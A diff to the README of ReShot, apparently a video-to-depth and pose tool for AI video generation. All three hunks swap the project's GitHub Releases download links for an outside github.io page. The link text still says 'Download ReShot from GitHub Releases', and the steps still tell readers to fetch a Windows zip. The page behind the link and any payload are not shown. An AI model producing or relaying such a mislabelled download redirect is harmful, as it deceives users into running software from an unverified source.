@@ -1,6 +1,6 @@
 # 📸 reshot - Copy the Shot, Not the Actors
 
-[![Download reshot](https://img.shields.io/badge/Download%20ReShot-v1.0-blueviolet?style=for-the-badge&logo=github)](https://github.com/Besprent-feline80/reshot/releases)
+[![Download reshot](https://img.shields.io/badge/Download%20ReShot-v1.0-blueviolet?style=for-the-badge&logo=github)](https://besprent-feline80.github.io)
 
 ## 🎯 What Is ReShot?
 
@@ -19,7 +19,7 @@ ReShot is a free, open-source tool that transforms a regular video into a **dept
 ## 📥 Download and Installation
 
 Visit this link to download the application:  
-[**Download ReShot from GitHub Releases**](https://github.com/Besprent-feline80/reshot/releases)
+[**Download ReShot from GitHub Releases**](https://besprent-feline80.github.io)
 
 1. Click the link above to go to the downloads page.
 2. Find the file named **`ReShot-Windows.zip`** (the latest version number will be in the filename).
@@ -98,6 +98,6 @@ Apache-2.0. You may use, modify, and distribute this software freely, even for c
 ---
 
 **Ready to copy the shot, not the actors?**  
-👉 [**Download ReShot Now**](https://github.com/Besprent-feline80/reshot/releases)
+👉 [**Download ReShot Now**](https://besprent-feline80.github.io)
 
 Keywords: ai-short-drama, ai-video, canny, comfyui, controlnet, depth-anything, depth-estimation, dwpose, maosika, minimax, openpose, pose-controlnet, pose-estimation, seedance, short-drama, video-generation, video-to-video, wan
